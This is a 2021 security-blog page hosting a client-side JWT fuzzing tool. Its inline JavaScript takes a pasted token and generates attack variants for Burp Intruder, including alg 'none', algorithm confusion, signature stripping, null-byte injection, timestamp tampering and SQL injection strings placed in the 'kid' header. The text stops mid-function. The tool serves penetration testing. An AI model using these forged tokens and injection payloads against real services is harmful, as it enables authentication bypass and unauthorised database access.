<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="JWT Fuzzing" /><meta property="og:locale" content="en_US" /><meta name="description" content="The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite." /><meta property="og:description" content="The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite." /><link rel="canonical" href="https://node-security.com/posts/jwt-fuzzing/" /><meta property="og:url" content="https://node-security.com/posts/jwt-fuzzing/" /><meta property="og:site_name" content="Node Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-25T18:03:38+10:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="JWT Fuzzing" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="zCs6F-1y95azrfcOnbFvS60JAILGGXaeG4vY1-JFacs" /> <script type="application/ld+json"> {"url":"https://node-security.com/posts/jwt-fuzzing/","@type":"BlogPosting","headline":"JWT Fuzzing","dateModified":"2021-05-28T23:25:17+10:00","datePublished":"2021-05-25T18:03:38+10:00","description":"The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite.","mainEntityOfPage":{"@type":"WebPage","@id":"https://node-security.com/posts/jwt-fuzzing/"},"@context":"https://schema.org"}</script><title>JWT Fuzzing | Node Security</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-RCTP6RS6T4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-RCTP6RS6T4'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/icon.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Node Security</a></div><div class="site-subtitle font-italic">Security & Programming Guides</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/O1dMate" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['o1dmate','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>JWT Fuzzing</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>JWT Fuzzing</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Alexander Wells </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, May 25, 2021, 6:03 PM +1000" prep="on" > May 25 <i class="unloaded">2021-05-25T18:03:38+10:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, May 28, 2021, 11:25 PM +1000" prefix="Updated " > May 28 <i class="unloaded">2021-05-28T23:25:17+10:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="176 words">1 min</span></div></div><div class="post-content"><p>The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite.</p><h1 id="warning">WARNING</h1><p>Be <strong>VERY</strong> careful when pasting JWT tokens into arbitrary websites! JWT’s can grant access to systems and must be treated as confidential.</p><p><strong>ALL</strong> processing on this website is done <strong>client-side</strong>. However, this may not be case with other sites.</p><p>The value in the input field below is stored in session storage for temporary persistance (refreshes and changing pages). This is cleared when your browser/tab is closed. If you don’t want tokens stored at all, update the option below:</p><p><input type="radio" id="storeJwtToken" name="storeJwtToken" onchange="radioChange(true)" /> <label for="storeJwtToken">Temp Store</label><br /> <input type="radio" id="doNotStoreJwtToken" name="storeJwtToken" onchange="radioChange(false)" /> <label for="doNotStoreJwtToken">Do not Temp Store</label></p><h1 id="insert-jwt">Insert JWT</h1><style> .inputField { width: 100%; color: #bfbfbf; background-color: #252525; border-block-color: #252525; resize: none; outline: none; border: none; border-radius: 6px; padding: 1rem; margin-right: 1rem; font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; } .textArea { width: 100%; color: #bfbfbf; background-color: #252525; border-block-color: #252525; resize: none; outline: none; border: none; border-radius: 6px; padding: 1rem; margin-right: 1rem; font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; white-space: pre-wrap; } .buttonStyle { cursor: pointer; border: none; border-radius: 3px; color: #ddd; margin-top: 0.5rem; background-color: #0072B5; } .buttonStyle:hover { box-shadow: 0px 0px 15px 5px rgb(0, 114, 181); }</style><p><button type="button" class="buttonStyle" onclick="generateTestJwt()">Generate Example JWT</button> <button type="button" class="buttonStyle" onclick="clearJwt()">Clear JWT</button></p><textarea id="jwtPayload" name="jwtPayload" spellcheck="false" placeholder="Paste JWT Token here ..." class="inputField" rows="4" oninput="jwtTokenChanged()"></textarea><h3 id="errorsWithJwt"></h3><div id="mainBlock" style="display: none;"><h1>JWT Data</h1><button type="button" class="buttonStyle" onclick="jwtTokenChanged()">Restore Data</button><h2>Header</h2><textarea id="jwtHeader" class="textArea" spellcheck="false" oninput="jwtFieldEdited('jwtFieldHeader')"> </textarea><h2>Payload</h2><textarea id="jwtBody" class="textArea" spellcheck="false" oninput="jwtFieldEdited('jwtFieldPayload')"> </textarea><ul id="sessionInfo"><li><span>Session length is <span id="jwtSessionTime"></span>.</span><br /><li><span id="jwtIssuedAt"></span><br /><li><span id="jwtExpiresAt">JWT is <span id="jwtExpiresAt1"></span><span id="jwtExpiresAt2"></span></span><br /></ul><h2>Signature</h2><textarea id="jwtSignature" class="textArea" spellcheck="false" oninput="jwtFieldEdited('jwtFieldSignature')"> </textarea><h3 id="jwtFieldsError"></h3><div id="secondaryBlock"><h1>Suggested Modifications</h1><ul id="suggestedPayloads"></ul><button type="button" class="buttonStyle" onclick="copyAllToClipboard()">Copy Payloads to Clipboard</button> <button id="flipShowDecodedJwtsButton" type="button" class="buttonStyle" onclick="flipShowDecodedJwts()">Show Decoded JWTs</button><p id="totalPayloads"></p><div id="payloadList"></div></div></div><script> let showDecodedJwts = false; function flipShowDecodedJwts() { if (showDecodedJwts) { showDecodedJwts = false; document.getElementById('flipShowDecodedJwtsButton').innerText = "Show Decoded JWTs"; } else { showDecodedJwts = true; document.getElementById('flipShowDecodedJwtsButton').innerText = "Show Encoded JWTs"; } createPayloads(); } function generatePayloads(header, body, signature) { let payloads = []; let tempHeader = null; let tempBody = null; let currentTime = Math.floor(Date.now() / 1000); let tokenIAT = body.iat; let tokenEXP = body.exp; let tokenValidFor = tokenEXP-tokenIAT; /* Algorithm 'none' */ payloads.push("$$@@Algorithm 'none'@@$$"); payloads.push(joinComponents({...header, alg: 'none'}, body, signature)); /* Algorithm 'none' & Remove Signature */ payloads.push("$$@@Algorithm 'none' & Remove Signature@@$$"); payloads.push(joinComponents({...header, alg: 'none'}, body, null)); /* Null Byte Injection */ payloads.push("$$@@Null Byte Injection@@$$"); payloads.push([btoa('\x00' + JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body) + '\x00').replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body) + '\x00').replace(/\=/g, '')].join('.')); payloads.push(joinComponents(header, body, btoa('\x00' + atob(signature)))); payloads.push(joinComponents(header, body, btoa(atob(signature) + '\x00'))); payloads.push(joinComponents({...header, alg: header.alg+'\x00'}, body, signature)); payloads.push(joinComponents({...header, alg: header.alg+'\x00'}, body, null)); payloads.push(joinComponents({...header, alg: '\x00'+header.alg}, body, signature)); payloads.push(joinComponents({...header, alg: '\x00'+header.alg}, body, null)); /* Modify Algorithms */ payloads.push("$$@@Modify Algorithms@@$$"); if(header.alg.startsWith('HS')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS', 'RS')}, body, signature)); if(header.alg.startsWith('RS')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS', 'HS')}, body, signature)); if(header.alg.startsWith('ES')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES', 'HS')}, body, signature)); if(header.alg.startsWith('PS')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS', 'HS')}, body, signature)); if(header.alg.startsWith('HS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS256', 'HS512')}, body, signature)); if(header.alg.startsWith('HS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS384', 'HS512')}, body, signature)); if(header.alg.startsWith('HS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS512', 'HS256')}, body, signature)); if(header.alg.startsWith('RS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS256', 'RS512')}, body, signature)); if(header.alg.startsWith('RS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS384', 'RS512')}, body, signature)); if(header.alg.startsWith('RS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS512', 'RS256')}, body, signature)); if(header.alg.startsWith('ES256')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES256', 'ES512')}, body, signature)); if(header.alg.startsWith('ES384')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES384', 'ES512')}, body, signature)); if(header.alg.startsWith('ES512')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES512', 'ES256')}, body, signature)); if(header.alg.startsWith('PS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS256', 'PS512')}, body, signature)); if(header.alg.startsWith('PS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS384', 'PS512')}, body, signature)); if(header.alg.startsWith('PS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS512', 'PS256')}, body, signature)); /* Modify Algorithms & Remove Signature */ payloads.push("$$@@Modify Algorithms & Remove Signature@@$$"); if(header.alg.startsWith('HS')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS', 'RS')}, body, null)); if(header.alg.startsWith('RS')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS', 'HS')}, body, null)); if(header.alg.startsWith('ES')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES', 'HS')}, body, null)); if(header.alg.startsWith('PS')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS', 'HS')}, body, null)); if(header.alg.startsWith('HS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS256', 'HS512')}, body, null)); if(header.alg.startsWith('HS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS384', 'HS512')}, body, null)); if(header.alg.startsWith('HS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('HS512', 'HS256')}, body, null)); if(header.alg.startsWith('RS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS256', 'RS512')}, body, null)); if(header.alg.startsWith('RS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS384', 'RS512')}, body, null)); if(header.alg.startsWith('RS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('RS512', 'RS256')}, body, null)); if(header.alg.startsWith('ES256')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES256', 'ES512')}, body, null)); if(header.alg.startsWith('ES384')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES384', 'ES512')}, body, null)); if(header.alg.startsWith('ES512')) payloads.push(joinComponents({...header, alg: header.alg.replace('ES512', 'ES256')}, body, null)); if(header.alg.startsWith('PS256')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS256', 'PS512')}, body, null)); if(header.alg.startsWith('PS384')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS384', 'PS512')}, body, null)); if(header.alg.startsWith('PS512')) payloads.push(joinComponents({...header, alg: header.alg.replace('PS512', 'PS256')}, body, null)); /* Invalid Header Base64 */ payloads.push("$$@@Invalid Header Base64@@$$"); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, '') + 'a', btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, '') + 'aa', btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, '') + 'aaa', btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, '') + 'aaaa', btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); /* Invalid Payload Base64 */ payloads.push("$$@@Invalid Payload Base64@@$$"); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '') + 'a', signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '') + 'aa', signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '') + 'aaa', signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '') + 'aaaa', signature].join('.')); /* Invalid Header JSON */ payloads.push("$$@@Invalid Header JSON@@$$"); payloads.push([btoa(JSON.stringify(header) + '}').replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header) + '"').replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, ''), signature].join('.')); /* Invalid Payload JSON */ payloads.push("$$@@Invalid Payload JSON@@$$"); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body) + '}').replace(/\=/g, ''), signature].join('.')); payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body) + '"').replace(/\=/g, ''), signature].join('.')); /* Invalid Algorithm */ payloads.push("$$@@Invalid Algorithm@@$$"); payloads.push(joinComponents({...header, alg: null}, body, signature)); payloads.push(joinComponents({...header, alg: ''}, body, signature)); payloads.push(joinComponents({...header, alg: 'JWS'}, body, signature)); payloads.push(joinComponents({...header, alg: 'JWE'}, body, signature)); payloads.push(joinComponents({...header, alg: []}, body, signature)); payloads.push(joinComponents({...header, alg: {}}, body, signature)); payloads.push(joinComponents({...header, alg: 0}, body, signature)); payloads.push(joinComponents({...header, alg: '\''}, body, signature)); payloads.push(joinComponents({...header, alg: '`'}, body, signature)); payloads.push(joinComponents({...header, alg: '%00'}, body, signature)); payloads.push(joinComponents({...header, alg: '\x00'}, body, signature)); /* Invalid Type */ payloads.push("$$@@Invalid Type@@$$"); payloads.push(joinComponents({...header, typ: null}, body, signature)); payloads.push(joinComponents({...header, typ: ''}, body, signature)); payloads.push(joinComponents({...header, typ: 'JWS'}, body, signature)); payloads.push(joinComponents({...header, typ: 'JWE'}, body, signature)); payloads.push(joinComponents({...header, typ: []}, body, signature)); payloads.push(joinComponents({...header, typ: {}}, body, signature)); payloads.push(joinComponents({...header, typ: 0}, body, signature)); payloads.push(joinComponents({...header, typ: '\''}, body, signature)); payloads.push(joinComponents({...header, typ: '`'}, body, signature)); payloads.push(joinComponents({...header, typ: '%00'}, body, signature)); payloads.push(joinComponents({...header, typ: '\x00'}, body, signature)); /* Invalid Signature */ payloads.push("$$@@Invalid Signature@@$$"); payloads.push(joinComponents(header, body, 'a')); payloads.push(joinComponents(header, body, signature+'a')); /* Invalid Signature with Bad Characters */ payloads.push("$$@@Invalid Signature with Bad Characters@@$$"); let badPayloads = ['c̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈','̡͓̞ͅc҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰','̗̺͖̹W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫','Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮','Ｔｈｅ','𝐓𝐡𝐞','𝕿𝖍𝖊','𝑻𝒉𝒆','𝓣𝓱𝓮','𝕋𝕙𝕖','𝚃𝚑𝚎','⒯⒣⒠','🚾 🆒 🆓','0️⃣ 1️⃣ 2️⃣ ','１２３','١٢٣','ᴉs ɐ',',!,','!,!','Ω≈ç√∫˜µ≤≥÷','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็']; badPayloads.forEach(badPayload => { payloads.push(joinComponents(header, body, badPayload)); }); /* Modify IssuedAt ('iat') & Expiration('exp') */ payloads.push("$$@@Modify IssuedAt ('iat') & Expiration('exp')@@$$"); if (body.hasOwnProperty('exp')) { payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), exp: tokenEXP+1}, signature)); } if (body.hasOwnProperty('iat')) { payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: tokenIAT+1}, signature)); } if (body.hasOwnProperty('exp') && body.hasOwnProperty('iat')) { payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: tokenIAT+1, exp: tokenEXP+1}, signature)); payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: currentTime, exp: currentTime+tokenValidFor}, signature)); } payloads.push(joinComponents(header, {...JSON.parse(JSON.stringify(body)), iat: currentTime, exp: currentTime+3597}, signature)); /* Large Number for IssuedAt ('iat') & Expiration('exp') & */ payloads.push("$$@@Large Number for IssuedAt ('iat') & Expiration('exp')@@$$"); if (body.hasOwnProperty('exp')) { tempBody = {...JSON.parse(JSON.stringify(body))}; tempBody.exp = "__REPLACE__THIS__"; payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(tempBody).replace('"__REPLACE__THIS__"', '9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999')).replace(/\=/g, ''), signature].join('.')); } if (body.hasOwnProperty('iat')) { tempBody = {...JSON.parse(JSON.stringify(body))}; tempBody.iat = "__REPLACE__THIS__"; payloads.push([btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(tempBody).replace('"__REPLACE__THIS__"', '9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999')).replace(/\=/g, ''), signature].join('.')); } /* Remove Algorithm */ payloads.push("$$@@Remove Algorithm@@$$"); tempHeader = {...JSON.parse(JSON.stringify(header))}; delete tempHeader.alg; payloads.push(joinComponents(tempHeader, body, signature)); payloads.push(joinComponents(tempHeader, body, null)); /* Remove Type */ payloads.push("$$@@Remove Type@@$$"); tempHeader = {...JSON.parse(JSON.stringify(header))}; delete tempHeader.typ; payloads.push(joinComponents(tempHeader, body, signature)); payloads.push(joinComponents(tempHeader, body, null)); /* Remove Signature */ payloads.push("$$@@Remove Signature@@$$"); payloads.push(joinComponents({...header}, body, null)); /* Empty Header */ payloads.push("$$@@Empty Header@@$$"); payloads.push(joinComponents({}, body, signature)); /* Empty Payload */ payloads.push("$$@@Empty Payload@@$$"); payloads.push(joinComponents(header, {}, signature)); /* Modify 'kid' */ if(header.hasOwnProperty('kid')) payloads.push("$$@@Modify 'kid'@@$$"); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: ''}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '12345'}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: null}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: []}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: {}}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '\x00'}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: ''}, body, null)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '12345'}, body, null)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: null}, body, null)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: []}, body, null)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: {}}, body, null)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '\x00'}, body, null)); /* 'kid' SQL Injection */ if(header.hasOwnProperty('kid')) payloads.push("$$@@'kid' SQL Injection@@$$"); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `'`}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '`'}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `';--`}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '`;--'}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `' OR 1=1;--`}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: '` OR 1=1;-'}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `' UNION SELECT 'test';--`}, body, signature)); if(header.hasOwnProperty('kid')) payloads.push(joinComponents({...header, kid: `' UNION SELECT 'P@ssMord$9';--`}, body, signature)); return payloads; } function joinComponents(header, body, signature) { let finalJWT = [btoa(JSON.stringify(header)).replace(/\=/g, ''), btoa(JSON.stringify(body)).replace(/\=/g, '')]; if(signature) { finalJWT.push(signature.trim()); } return finalJWT.join('.'); } function getTimeDifference(dateObj) { let seconds = 0; let minutes = 0; let hours = 0; /* Difference in seconds */ let difference = Math.abs(dateObj.getTime() - (new Date()).getTime()) / 1000.0; if(difference < 1) return `0 seconds`; if(difference < 2) return `1 second`; if(difference < 60) return `${Math.floor(difference)} seconds`; seconds = Math.floor(difference % 60); seconds = `${seconds} second${seconds===1 ? '' : 's'}`; /* Difference in minutes */ difference /= 60; if(difference < 2) return `1 minute, ${seconds}`; if(difference < 60) return `${Math.floor(difference)} minutes, ${seconds}`; minutes = Math.floor(difference % 60); minutes = `${minutes} minute${minutes===1 ? '' : 's'}`; /* Difference in hours */ difference /= 60; if(difference < 2) return `1 hour, ${minutes}, ${seconds}`; if(difference < 24) return `${Math.floor(difference)} hours, ${minutes}, ${seconds}`; hours = Math.floor(difference % 24); hours = `${hours} hour${hours===1 ? '' : 's'}`; /* Difference in days */ difference /= 24; if(difference < 2) return `1 day, ${hours}, ${minutes}, ${seconds}`; return `${Math.floor(difference)} days, ${hours}, ${minutes}, ${seconds}`; } function getJwtFromFields() { let jwt = {}; try { jwt.header = JSON.parse(document.getElementById('jwtHeader').value); } catch (err) { return "ERROR: Failed to Encode JWT Header as JSON"; } try { jwt.payload = JSON.parse(document.getElementById('jwtBody').value); } catch (err) { return "ERROR: Failed to Encode JWT Payload as JSON"; } try { jwt.signature = document.getElementById('jwtSignature').value; if (!jwt.signature) throw new Error(''); } catch (err) { return "ERROR: JWT Signature is Empty"; } return jwt; } function checkIfJwt(jwtString) { try { if(!jwtString) return 'empty'; let splitToken = jwtString.split('.'); let jwtHeader; let jwtBody; if(splitToken.length !== 3) return `JWT must contains 3 parts. Provided token contains ${splitToken.length} part${splitToken.length === 1 ? '' : 's'}`; try { atob(splitToken[0]) } catch (err) { return `JWT Header is not a valid base64 string` } try { atob(splitToken[1]) } catch (err) { return `JWT Payload is not a valid base64 string` } try { jwtHeader = JSON.parse(atob(splitToken[0])) } catch (err) { return `JWT Header is not a valid Object` } try { jwtBody = JSON.parse(atob(splitToken[1])) } catch (err) { return `JWT Payload is not a valid Object` } if(!Number.isInteger(jwtBody.iat)) return 'JWT Payload `iat` value is not an integer'; 